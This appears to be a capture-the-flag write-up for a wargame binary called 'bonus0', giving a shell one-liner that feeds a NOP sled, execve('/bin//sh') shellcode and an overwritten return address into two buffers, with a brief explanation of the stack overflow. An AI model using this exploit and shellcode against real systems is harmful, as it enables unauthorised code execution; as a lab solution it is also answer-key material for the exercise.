```shell
(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "A" * 9 + "\xbd\xe6\xff\xbf" + "B" * 7' ; cat -) | ./bonus0
```

Ok so basicly we can fill two buffers. The two have to be filled by at least 20 characters in order to trigger an overflow. The offset is of 9 character in the second buffer. The final buffer will be equal to : `buf1 + buf2 + space + buf2`, so we put the shellcode in the first buffer and the address to overwrite `eip` in the second one (pointing on the shellcode in the first buffer)
.
